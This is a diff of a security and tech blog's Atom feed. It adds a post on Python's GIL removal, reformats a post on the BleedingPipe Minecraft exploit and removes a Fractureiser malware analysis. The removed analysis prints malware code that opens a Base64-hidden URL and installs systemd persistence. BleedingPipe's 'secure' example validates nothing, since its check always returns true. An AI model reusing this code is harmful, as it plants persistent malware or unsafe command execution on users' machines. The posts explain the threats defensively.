@@ -3,12 +3,147 @@
     <title>DF Blogs</title>
     <link href="https://blog.thefourcraft.com/feed.xml" rel="self" />
     <link href="https://blog.thefourcraft.com" />
-    <updated>2023-08-01T11:46:30+03:00</updated>
+    <updated>2023-08-13T10:53:16+03:00</updated>
     <author>
         <name>thefourCraft</name>
     </author>
     <id>https://blog.thefourcraft.com</id>
 
+    <entry>
+        <title>A GIL-less Future for Python</title>
+        <author>
+            <name>thefourCraft</name>
+        </author>
+        <link href="https://blog.thefourcraft.com/a-gil-less-future-for-python/index.html"/>
+        <id>https://blog.thefourcraft.com/a-gil-less-future-for-python/index.html</id>
+        <media:content url="https://blog.thefourcraft.com/media/posts/63/A-GIL-less-Future-for-Python.png" medium="image" />
+            <category term="artificial intelligence"/>
+            <category term="Python"/>
+
+        <updated>2023-08-13T10:53:16+03:00</updated>
+            <summary>
+                <![CDATA[
+                        <img src="https://blog.thefourcraft.com/media/posts/63/A-GIL-less-Future-for-Python.png" alt="" />
+                    <p data-sourcepos="3:1-3:209">The Global Interpreter Lock (GIL) has been a fundamental part of CPython's design for decades. However, a new era is dawning for Python developers, with the possibility of building CPython without the GIL.</p>
+
+                ]]>
+            </summary>
+        <content type="html">
+            <![CDATA[
+                    <p><img src="https://blog.thefourcraft.com/media/posts/63/A-GIL-less-Future-for-Python.png" class="type:primaryImage" alt="" /></p>
+                <p data-sourcepos="3:1-3:209">The Global Interpreter Lock (GIL) has been a fundamental part of CPython's design for decades. However, a new era is dawning for Python developers, with the possibility of building CPython without the GIL.</p>
+
+<h2>Introduction to GIL</h2>
+<p>The Global Interpreter Lock (GIL) is a mutex that protects access to Python objects, preventing multiple native threads from executing Python bytecodes simultaneously. While it simplifies the implementation, it has been a bottleneck for multi-threaded applications.</p>
+<h3>Overview of CPython Changes</h3>
+<p>Removing the GIL requires substantial changes to CPython internals, including:</p>
+<ul>
+<li><strong>Reference Counting</strong>: Making reference counting thread-safe.</li>
+<li><strong>Memory Management</strong>: Replacing the internal allocator with a thread-safe one.</li>
+<li><strong>Container Thread-Safety</strong>: Using per-object locks for containers like lists and dictionaries.</li>
+<li><strong>Garbage Collection</strong>: Modifications to support the new structure.</li>
+</ul>
+<h2>Memory Management</h2>
+<p>The proposal includes replacing pymalloc with mimalloc, a general-purpose thread-safe allocator. This change also addresses issues related to garbage collection and container thread-safety.</p>
+<h2>Garbage Collection (Cycle Collection)</h2>
+<p>The garbage collector will require significant changes, including using "stop-the-world" to provide thread-safety and eliminating generational garbage collection.</p>
+<h3>The Historical Context of GIL</h3>
+<p>The Global Interpreter Lock (GIL) has been a part of Python since 1992, a year after Python's public release. During the early '90s, multi-core CPUs were not common, and the GIL was an effective solution to share the interpreter between different operating system threads. Guido van Rossum, Python's creator, reflected on the era, stating that the GIL became infamous when chip designers began putting multiple CPUs on one chip, leading to pressure for parallel processing.</p>
+<h3>Why GIL Was Retained</h3>
+<p>Several factors influenced the GIL's retention in Python. It was easy to implement, and single-thread programs worked fast. The GIL also prevented certain bugs, such as deadlocks, that could occur with fine-grained locks. However, similar to Linux's big kernel lock and FreeBSD's giant lock, the GIL only allowed one thread to be processed at a time, limiting efficiency.</p>
+<h3>The Push to Remove GIL</h3>
+<p>With the rise of neural network-based AI models and the need to exploit multiple types of parallelism, the GIL became a significant drawback. In languages other than Python, threads can run different parts of an AI model in separate CPU cores. The GIL's presence in Python blocked this possibility, leading to a growing consensus for its removal. A poll conducted by the Python team last month gauged the community's support for free threading and PEP 703, leading to the official acceptance of the proposal to remove the GIL.</p>
+<h3>A Cautious Approach to GIL Removal</h3>
+<p>The process of removing the GIL is long and cautious. The Python Enhancement Proposal (PEP) introduces a new build configuration flag to disable the GIL in CPython. The proposal is divided into short-term, mid-term, and long-term stages, with the GIL-free version eventually becoming the default Python interpreter. This transformation is seen as a win for the AI ecosystem and is led by Sam Gross, with Meta dedicating a serious engineering team to the effort.</p>
+<h3>Impact on Other Languages</h3>
+<p>An exciting outcome of Python's move towards a GIL-less future is its potential impact on other languages like Rust. Developers who previously turned to Rust for multi-threaded computation may now find Python without the GIL viable. This shift could lead to broader adoption of Python in areas where the GIL was previously a limitation.</p>
+<h3>Multi-Threading with GIL</h3>
+<p>With the GIL in place, multi-threading in Python can be restrictive. Even though you can create multiple threads, only one thread can execute Python bytecode at a time. Here's a simple example of multi-threading with the GIL:</p>
+<div class="bg-black rounded-md mb-4">
+<div class="flex items-center relative text-gray-200 bg-gray-800 px-4 py-2 text-xs font-sans justify-between rounded-t-md"> </div>
+<blockquote>
+<pre class="p-4 overflow-y-auto"><code class="!whitespace-pre hljs language-python"><span class="hljs-keyword">import</span> threading
+<span class="hljs-keyword">import</span> time
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">print_numbers</span>():
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):
+        time.sleep(<span class="hljs-number">1</span>)
+        <span class="hljs-built_in">print</span>(i)
+
+<span class="hljs-comment"># Creating two threads</span>
+thread1 = threading.Thread(target=print_numbers)
+thread2 = threading.Thread(target=print_numbers)
+
+<span class="hljs-comment"># Starting the threads</span>
+thread1.start()
+thread2.start()
+
+<span class="hljs-comment"># Waiting for both threads to complete</span>
+thread1.join()
+thread2.join()
+</code></pre>
+</blockquote>
+</div>
+<p>With the GIL, the threads don't truly run in parallel, leading to suboptimal performance on multi-core processors.</p>
+<h3>GIL Removal and True Parallelism</h3>
+<p>Without the GIL, Python can achieve true parallelism, allowing multiple threads to run simultaneously on different CPU cores. This can lead to significant performance improvements in CPU-bound tasks. Here's an example of how code might benefit from GIL removal:</p>
+<div class="bg-black rounded-md mb-4">
+<div class="flex items-center relative text-gray-200 bg-gray-800 px-4 py-2 text-xs font-sans justify-between rounded-t-md"> </div>
+<blockquote>
+<pre class="p-4 overflow-y-auto"><code class="!whitespace-pre hljs language-python"><span class="hljs-keyword">from</span> concurrent.futures <span class="hljs-keyword">import</span> ThreadPoolExecutor
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">compute_heavy_task</span>(<span class="hljs-params">x</span>):
+    <span class="hljs-comment"># Simulating a CPU-bound task</span>
+    <span class="hljs-keyword">return</span> x * x
+
+<span class="hljs-comment"># Using a thread pool to run tasks in parallel</span>
+<span class="hljs-keyword">with</span> ThreadPoolExecutor() <span class="hljs-keyword">as</span> executor:
+    results = <span class="hljs-built_in">list</span>(executor.<span class="hljs-built_in">map</span>(compute_heavy_task, <span class="hljs-built_in">range</span>(<span class="hljs-number">1000</span>)))
+
+<span class="hljs-built_in">print</span>(results)
+</code></pre>
+</blockquote>
+</div>
+<p>Without the GIL, this code can utilize all available CPU cores, leading to faster execution.</p>
+<h3>Impact on Reference Counting</h3>
+<p>Removing the GIL requires reference counting changes to make it thread-safe. Here's a simplified example of how reference counting might be implemented without the GIL:</p>
+<div class="bg-black rounded-md mb-4">
+<div class="flex items-center relative text-gray-200 bg-gray-800 px-4 py-2 text-xs font-sans justify-between rounded-t-md"> </div>
+<blockquote>
+<pre class="p-4 overflow-y-auto"><code class="!whitespace-pre hljs language-c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">object</span> {</span>
+  <span class="hljs-type">uintptr_t</span> ob_tid; <span class="hljs-comment">// owning thread id</span>
+  <span class="hljs-type">uint32_t</span> ob_ref_local; <span class="hljs-comment">// local reference count for the owning thread</span>
+  Py_ssize_t ob_ref_shared; <span class="hljs-comment">// shared reference count for other threads</span>
+  <span class="hljs-comment">// ...</span>
+};
+
+<span class="hljs-comment">// Incrementing the reference count</span>
+<span class="hljs-type">void</span> <span class="hljs-title function_">INCREF</span><span class="hljs-params">(PyObject *obj)</span> {
+  <span class="hljs-keyword">if</span> (obj-&gt;ob_tid == current_thread_id()) {
+    obj-&gt;ob_ref_local++;
+  } <span class="hljs-keyword">else</span> {
+    atomic_increment(&amp;obj-&gt;ob_ref_shared);
+  }
+}
+</code></pre>
+</blockquote>
+</div>
+<p>This example illustrates how reference counting can be adapted to support multi-threading without the GIL, using a combination of local and shared reference counts.</p>
+<h2>Sources</h2>
+<ol>
+<li><a href="https://github.com/colesbury/nogil-3.12" target="_new">GitHub Repository - nogil-3.12</a></li>
+<li><a href="https://github.com/colesbury/nogil" target="_new">GitHub Repository - nogil</a></li>
+<li><a href="https://arxiv.org/abs/1908.04705" target="_new">Research Paper on Biased Reference Counting</a></li>
+<li><a href="https://analyticsindiamag.com/a-gil-less-future-for-python-beckons-developers/">A GIL-less Future for Python Beckons Developers</a></li>
+<li><a href="https://discuss.python.org/t/poll-feedback-to-the-sc-on-making-cpython-free-threaded-and-pep-703/28540" target="_blank" rel="noopener noreferrer">Poll: Feedback to the SC on making CPython free-threaded and PEP 703</a></li>
+<li><a href="https://peps.python.org/pep-0703/#build-configuration-changes">PEP 703 – Making the Global Interpreter Lock Optional in CPython</a></li>
+<li><a href="https://lwn.net/Articles/843660/">Python 2-&gt;3 transition was horrifically bad</a></li>
+<li><a href="https://discuss.python.org/t/a-fast-free-threading-python/27903/99">A fast, free threading Python </a></li>
+<li><a href="https://analyticsindiamag.com/python-may-not-be-great-for-backend-but-is-still-preferred-for-ml/">Python may Not be Great for Backend but is Still Preferred for ML</a></li>
+</ol>
+            ]]>
+        </content>
+    </entry>
     <entry>
         <title>Minecraft Mayhem: The BleedingPipe Exploit</title>
         <author>
@@ -22,18 +157,18 @@
             <category term="Malware"/>
             <category term="Documentary"/>
 
-        <updated>2023-08-01T11:46:30+03:00</updated>
+        <updated>2023-08-01T13:21:42+03:00</updated>
             <summary>
                 <![CDATA[
                         <img src="https://blog.thefourcraft.com/media/posts/62/Minecraft-Mayhem-The-BleedingPipe-Exploit.png" alt="" />
-                    <p>A new exploit has been spotted in the wild, enabling complete remote code execution (RCE) on clients and servers running popular Minecraft mods on 1.7.10/1.12.2 Forge. </p>
+                    <p>A new exploit has been spotted in the wild, enabling complete remote code execution (RCE) on clients and servers running popular Minecraft mods on 1.7.10/1.12.2 Forge.</p>
 
                 ]]>
             </summary>
         <content type="html">
             <![CDATA[
                     <p><img src="https://blog.thefourcraft.com/media/posts/62/Minecraft-Mayhem-The-BleedingPipe-Exploit.png" class="type:primaryImage" alt="" /></p>
-                <p>A new exploit has been spotted in the wild, enabling complete remote code execution (RCE) on clients and servers running popular Minecraft mods on 1.7.10/1.12.2 Forge. </p>
+                <p>A new exploit has been spotted in the wild, enabling complete remote code execution (RCE) on clients and servers running popular Minecraft mods on 1.7.10/1.12.2 Forge.</p>
 
 <p class="msg msg--warning">It's crucial to understand that this vulnerability doesn't stem from Forge itself but mods that employ unsafe deserialization code.</p>
 <h2>The Vulnerable Mods</h2>
@@ -48,10 +183,37 @@
 <p>Updating EnderIO or LogisticsPipes to the latest CurseForge versions is recommended to mitigate the risk. For BDLib users, a migration to the GT New Horizons fork is suggested. The PipeBlocker mod can also be installed on forge servers and clients for general mitigation.</p>
 <h2>A Technical Examination</h2>
 <p>The root cause of the BleedingPipe exploits lies in the use of ObjectInputStream for networking code in the affected mods. This sends packets with malicious serialization, enabling any code to be run on the server, which can then infect all clients.</p>
-<pre><code>// Hypothetical example of vulnerable code</code><br><code>public class VulnerableClass {</code><br><code>    public void executeCommand(String command) {</code><br><code>        try {</code><br><code>            Runtime.getRuntime().exec(command);</code><br><code>        } catch (IOException e) {</code><br><code>            e.printStackTrace();</code><br><code>        }</code><br><code>    }</code><br><code>}</code></pre>
+<pre><code>// Hypothetical example of vulnerable code
+public class VulnerableClass {
+    public void executeCommand(String command) {
+        try {
+            Runtime.getRuntime().exec(command);
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+}
+</code></pre>
 <p>In the example above, the <code>executeCommand</code> method is vulnerable to RCE because it executes any command it receives without any validation or sanitization. This is a simplified example; actual vulnerabilities can be much more complex and harder to spot.</p>
 <div class="bg-black rounded-md mb-4">
-<pre class="flex items-center relative text-gray-200 bg-gray-800 px-4 py-2 text-xs font-sans justify-between rounded-t-md"><code>// Hypothetical example of a secure code</code><br><code>public class SecureClass {</code><br><code>    public void executeCommand(String command) {</code><br><code>        if (isValidCommand(command)) {</code><br><code>            try {</code><br><code>                Runtime.getRuntime().exec(command);</code><br><code>            } catch (IOException e) {</code><br><code>                e.printStackTrace();</code><br><code>            }</code><br><code>        }</code><br><code>    }</code><br><br><code>    private boolean isValidCommand(String command) {</code><br><code>        // Implement validation logic here</code><br><code>        return true;</code><br><code>    }</code><br><code>}</code></pre>
+<pre class="flex items-center relative text-gray-200 bg-gray-800 px-4 py-2 text-xs font-sans justify-between rounded-t-md"><code>// Hypothetical example of a secure code
+public class SecureClass {
+    public void executeCommand(String command) {
+        if (isValidCommand(command)) {
+            try {
+                Runtime.getRuntime().exec(command);
+            } catch (IOException e) {
+                e.printStackTrace();
+            }
+        }
+    }
+
+    private boolean isValidCommand(String command) {
+        // Implement validation logic here
+        return true;
+    }
+}
+</code></pre>
 <div>In the secure code version, the <code>executeCommand</code> method checks if the command is valid before executing it. This basic form of input validation can help prevent RCE attacks.</div>
 <div>
 <p>The BleedingPipe exploit is another stark reminder of the ever-present threats in the digital landscape, even in seemingly innocuous environments like Minecraft modding. It underscores the importance of vigilance, regular updates, and secure coding practices.</p>
@@ -597,70 +759,6 @@
 </div>
 </div>
 </div>
-            ]]>
-        </content>
-    </entry>
-    <entry>
-        <title>The Devastating Fractureiser: Minecraft&#x27;s Malware Outbreak</title>
-        <author>
-            <name>thefourCraft</name>
-        </author>
-        <link href="https://blog.thefourcraft.com/the-devastating-fractureiser-minecrafts-malware-outbreak/index.html"/>
-        <id>https://blog.thefourcraft.com/the-devastating-fractureiser-minecrafts-malware-outbreak/index.html</id>
-        <media:content url="https://blog.thefourcraft.com/media/posts/53/The-Devastating-Fractureiser-Minecrafts-Malware-Outbreak.png" medium="image" />
-            <category term="Minecraft"/>
-            <category term="Malware"/>
-            <category term="Fractureiser"/>
-
-        <updated>2023-06-28T18:12:19+03:00</updated>
-            <summary>
-                <![CDATA[
-                        <img src="https://blog.thefourcraft.com/media/posts/53/The-Devastating-Fractureiser-Minecrafts-Malware-Outbreak.png" alt="" />
-                    <p>In Minecraft, a new threat has emerged A malware known as the "Fractureiser" has been causing havoc, infecting mods and spreading. This blog post aims to shed light on this devastating outbreak, providing an in-depth analysis of the malware, its impact, and the steps taken by the community to combat it.</p>
-
-                ]]>
-            </summary>
-        <content type="html">
-            <![CDATA[
-                    <p><img src="https://blog.thefourcraft.com/media/posts/53/The-Devastating-Fractureiser-Minecrafts-Malware-Outbreak.png" class="type:primaryImage" alt="" /></p>
-                <p>In Minecraft, a new threat has emerged A malware known as the "Fractureiser" has been causing havoc, infecting mods and spreading. This blog post aims to shed light on this devastating outbreak, providing an in-depth analysis of the malware, its impact, and the steps taken by the community to combat it.</p>
-
-<h2>The Emergence of Fractureiser</h2>
-<p>The Fractureiser malware was first discovered when a Minecraft server hosting company, MCHost.no, was contacted by a customer reporting that his server was not starting correctly. The server would freeze when loading the plugins, a symptom that usually indicates a problem with a faulty or incompatible plugin. However, after several days of back and forth, it was discovered that the issue was much more severe. The customer's plugins were infected with a "virus" that he had unknowingly downloaded from a shady <sup><a href="https://ljskatt.no/analysis/updater_class/" id="user-content-fnref-1%5E" data-footnote-ref="true" aria-describedby="footnote-label" target="_new">1</a></sup>.</p>
-<p>The malware was traced back to a class file named "Updater.Class" found in the infected plugins. The file was encoded and could not be decompiled using standard methods, making it difficult to understand its functionality <sup><a href="https://ljskatt.no/analysis/updater_class/" id="user-content-fnref-1%5E-2" data-footnote-ref="true" aria-describedby="footnote-label" target="_new">1</a></sup>. However, further investigation revealed that the malware connected to a host via an encoded URL <sup><a href="https://ljskatt.no/analysis/updater_class/" id="user-content-fnref-1%5E-3" data-footnote-ref="true" aria-describedby="footnote-label" target="_new">1</a></sup>.</p>
-<h2>The Fractureiser's Modus Operandi</h2>
-<p>The Fractureiser malware operates by infecting Minecraft mods and spreading across servers. It uses a class file named "Updater.Class" to infect plugins and then connects to a host via an encoded URL <sup><a href="https://ljskatt.no/analysis/updater_class/" id="user-content-fnref-1%5E-4" data-footnote-ref="true" aria-describedby="footnote-label" target="_new">1</a></sup>. The malware also sets itself up for continued access, making it challenging to remove <sup><a href="https://ljskatt.no/analysis/updater_class/" id="user-content-fnref-1%5E-5" data-footnote-ref="true" aria-describedby="footnote-label" target="_new">1</a></sup>.</p>
-<p>The malware was found to be particularly dangerous as it could spread across servers. However, due to the use of Docker containers for hosting Minecraft servers on MCHost.no, each server was isolated, preventing the malware from spreading between servers <sup><a href="https://ljskatt.no/analysis/updater_class/" id="user-content-fnref-1%5E-6" data-footnote-ref="true" aria-describedby="footnote-label" target="_new">1</a></sup>.</p>
-<h2>The Community's Response</h2>
-<p>The Minecraft community has taken several steps to combat the Fractureiser malware in response to the outbreak. A detection tool was developed to help users identify if their computer has been infected <sup><a href="https://support.curseforge.com/en/support/solutions/articles/9000228509-june-2023-infected-mods-detection-tool/" id="user-content-fnref-4%5E" data-footnote-ref="true" aria-describedby="footnote-label" target="_new">2</a></sup>. The tool checks if the user's system is infected and lists the detected files <sup><a href="https://support.curseforge.com/en/support/solutions/articles/9000228509-june-2023-infected-mods-detection-tool/" id="user-content-fnref-4%5E-2" data-footnote-ref="true" aria-describedby="footnote-label" target="_new">2</a></sup>. If an infection is found, the user is advised to delete the infected files and run independent malware scanning tools <sup><a href="https://support.curseforge.com/en/support/solutions/articles/9000228509-june-2023-infected-mods-detection-tool/" id="user-content-fnref-4%5E-3" data-footnote-ref="true" aria-describedby="footnote-label" target="_new">2</a></sup>.</p>
-<p>In addition to the detection tool, a scanning tool was also developed to detect any dormant or other infected mods/Jar files <sup><a href="https://support.curseforge.com/en/support/solutions/articles/9000228509-june-2023-infected-mods-detection-tool/" id="user-content-fnref-4%5E-4" data-footnote-ref="true" aria-describedby="footnote-label" target="_new">2</a></sup>. This tool scans for stage 0 vulnerability and can detect any infected Jars <sup><a href="https://support.curseforge.com/en/support/solutions/articles/9000228509-june-2023-infected-mods-detection-tool/" id="user-content-fnref-4%5E-5" data-footnote-ref="true" aria-describedby="footnote-label" target="_new">2</a></sup>.</p>
-<h2>The Impact of the Fractureiser Malware</h2>
-<p>The impact of the Fractureiser malware has been significant, with several mods being infected and taken down permanently <sup><a href="https://support.curseforge.com/en/support/solutions/articles/9000228509-june-2023-infected-mods-detection-tool/" id="user-content-fnref-4%5E-6" data-footnote-ref="true" aria-describedby="footnote-label" target="_new">2</a></sup>. The malware has also infected several Bukkit plugins <sup><a href="https://support.curseforge.com/en/support/solutions/articles/9000228509-june-2023-infected-mods-detection-tool/" id="user-content-fnref-4%5E-7" data-footnote-ref="true" aria-describedby="footnote-label" target="_new">2</a></sup>. At the time of detection, the total non-unique downloads for some of the infected mods and plugins were in the hundreds, indicating the widespread nature of the infection <sup><a href="https://support.curseforge.com/en/support/solutions/articles/9000228509-june-2023-infected-mods-detection-tool/" id="user-content-fnref-4%5E-8" data-footnote-ref="true" aria-describedby="footnote-label" target="_new">2</a></sup>.</p>
-<p>The following code snippets are from the Fractureiser malware and provide insight into how it operates:</p>
-<p>This snippet shows how the malware connects to a host via an encoded URL:</p>
-<pre><code>HttpURLConnection var2 = (HttpURLConnection)(new URL(new String(Base64.getDecoder().decode("aHR0cDovL2ZpbGVzLnNreXJhZ2UuZGUvdXBkYXRl")))).openConnection();</code></pre>
-<p>The malware connects to a host using an encoded URL. The URL is decoded from Base64 format and then used to open a connection. This method allows the malware to hide the URL it connects to, making it harder for security systems to detect and block it.</p>
-<p>This snippet shows how the malware sets itself up for continued access:</p>
-<pre>var0 = new File("/bin/vmd-gnu");<br>File var1 = new File("/etc/systemd/system/vmd-gnu.service");<br>String var2 = "[Unit]\\nDescription=vmd-gnu local service\\nAfter=network.target\\nStartLimitIntervalSec=0\\n\\n[Service]\\nType=simple\\nRestart=always\\nRestartSec=1\\nUser=" + System.getProperty("user.name") + "\\nExecStart=/bin/sh -c \\\"java -Dauto=true -jar /bin/vmd-gnu\\\"\\n\\n[Install]\\nWantedBy=multi-user.target";<br>URL var3 = O.class.getProtectionDomain().getCodeSource().getLocation();<br>Files.copy((new File(var3.getFile())).toPath(), var0.toPath(), StandardCopyOption.REPLACE_EXISTING);<br>Files.write(var1.toPath(), var2.getBytes(), new OpenOption[0]);<br>Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", "systemctl enable vmd-gnu"}).waitFor();<br>Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", "systemctl start vmd-gnu"}).waitFor();</pre>
-<p>The malware sets itself up for continued access by creating a new service in the system. It creates a new file in the "/bin" directory and a new service in the "/etc/systemd/system" directory. The service is configured to restart always, ensuring that the malware remains active even if the system is rebooted or the process is killed. The service runs with the same privileges as the user, allowing it to perform actions on behalf of the user.</p>
-<h2>The Aftermath</h2>
-<p>The aftermath of the Fractureiser malware outbreak was intense activity within the Minecraft community. The hosting company, MCHost.no, took immediate steps to block the domain associated with the malware, thereby reducing its potential harm<sup><a href="https://ljskatt.no/analysis/updater_class/" id="user-content-fnref-1%5E" data-footnote-ref="true" aria-describedby="footnote-label" target="_new">1</a></sup>. The customer whose server was initially infected had to reinstall all plugins and server.jar, but after these steps, the server was no longer connecting to the malicious server <sup><a href="https://ljskatt.no/analysis/updater_class/" id="user-content-fnref-1%5E-2" data-footnote-ref="true" aria-describedby="footnote-label" target="_new">1</a></sup>.</p>
-<p>The community also rallied to provide support and solutions. A detection tool was developed and made available to help users identify if their computer had been infected <sup><a href="https://support.curseforge.com/en/support/solutions/articles/9000228509-june-2023-infected-mods-detection-tool/" id="user-content-fnref-4%5E" data-footnote-ref="true" aria-describedby="footnote-label" target="_new">2</a></sup>. The tool checks if the user's system is infected and lists the detected files <sup><a href="https://support.curseforge.com/en/support/solutions/articles/9000228509-june-2023-infected-mods-detection-tool/" id="user-content-fnref-4%5E-2" data-footnote-ref="true" aria-describedby="footnote-label" target="_new">2</a></sup>. If an infection is found, the user is advised to delete the infected files and run independent malware scanning tools <sup><a href="https://support.curseforge.com/en/support/solutions/articles/9000228509-june-2023-infected-mods-detection-tool/" id="user-content-fnref-4%5E-3" data-footnote-ref="true" aria-describedby="footnote-label" target="_new">2</a></sup>.</p>
-<p>In addition to the detection tool, a scanning tool was also developed to detect any dormant or other infected mods/Jar files <sup><a href="https://support.curseforge.com/en/support/solutions/articles/9000228509-june-2023-infected-mods-detection-tool/" id="user-content-fnref-4%5E-4" data-footnote-ref="true" aria-describedby="footnote-label" target="_new">2</a></sup>. This tool scans for stage 0 vulnerability and can detect any infected Jars <sup><a href="https://support.curseforge.com/en/support/solutions/articles/9000228509-june-2023-infected-mods-detection-tool/" id="user-content-fnref-4%5E-5" data-footnote-ref="true" aria-describedby="footnote-label" target="_new">2</a></sup>.</p>
-<h2>Lessons Learned</h2>
-<p>The Fractureiser malware outbreak has served as a stark reminder of the potential threats that exist in the world of online gaming. It has highlighted the importance of downloading mods and plugins from trusted sources to avoid such issues in the future. The swift response of the Minecraft community in developing detection and scanning tools to combat the malware is commendable. It serves as an example of the power of community collaboration in the face of adversity.</p>
-<p>The incident has also underscored the importance of vigilance and proactive measures in maintaining the security of online gaming environments. As the Fractureiser malware has shown, even seemingly harmless activities like downloading a Minecraft mod can have severe consequences without caution.</p>
-<h2>References</h2>
-<section class="footnotes" data-footnotes="true">
-<ol>
-<li id="user-content-fn-1%5E">
-<p><a href="https://ljskatt.no/analysis/updater_class/" target="_new">Lars Jørgen Skattebo - Updater.class</a></p>
-</li>
-<li id="user-content-fn-4%5E">
-<p><a href="https://support.curseforge.com/en/support/solutions/articles/9000228509-june-2023-infected-mods-detection-tool/" target="_new">CurseForge Support - June 2023 - Infected mods detection tool</a></p>
-</li>
-</ol>
-</section>
             ]]>
         </content>
     </entry>
